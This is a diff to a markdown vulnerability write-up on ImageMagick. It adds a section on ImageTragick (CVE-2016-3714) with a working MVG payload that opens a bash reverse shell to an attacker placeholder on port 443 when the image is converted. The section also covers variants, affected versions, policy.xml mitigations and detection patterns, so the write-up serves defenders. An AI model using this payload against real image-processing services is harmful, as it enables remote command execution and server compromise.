@@ -1,6 +1,6 @@
 ---
 title: ImageMagick CVE-2022-44268 — arbitrary file read
-tags: [linux, web, imagemagick, png, cve-2022-44268, file-read]
+tags: [linux, web, imagemagick, png, cve-2022-44268, cve-2016-3714, file-read, rce]
 ---
 
 # CVE-2022-44268: ImageMagick reads whatever you ask
@@ -80,3 +80,27 @@ PY
 - Detection: uploaded PNGs with a `tEXt` keyword of `profile`, or whose value looks like an absolute path.
 
 MITRE: T1005, T1190, T1552.001.
+
+## 8. Addendum: ImageTragick (CVE-2016-3714)
+
+The same conversion surface has an older, more direct bug: ImageMagick does not filter the MVG/MSL/SVG coders and allows command execution through an `https://` URL or a pipe. An `.mvg` file with `fill 'url(https://"|id")'` runs `id` when the image is converted.
+
+```bash
+cat > exploit.mvg <<'EOF'
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://"|bash -i >& /dev/tcp/<ATTACKER>/443 0>&1")'
+pop graphic-context
+EOF
+convert exploit.mvg out.png
+```
+
+Common variants: `msl:` with `read`, an SVG with `<image xlink:href="https://...">`, and a `delegate` that calls `curl`/`wget`. It affects versions before 6.9.3-9 / 7.0.1-1; the patch adds filters to the delegates. Mitigation is the same `policy.xml`, plus disabling the `MVG`, `MSL`, `EPHEMERAL` and `URL` coders when unused.
+
+Detection: image-extension files containing `url(https://`, `msl:`, or SVG with an external `xlink:href`. MITRE: T1005, T1190, T1552.001.
+
+## References
+
+- <https://imagemagick.org/script/security-policy.php>
+- <https://nvd.nist.gov/vuln/detail/CVE-2016-3714>
+- <https://imagetragick.com/>
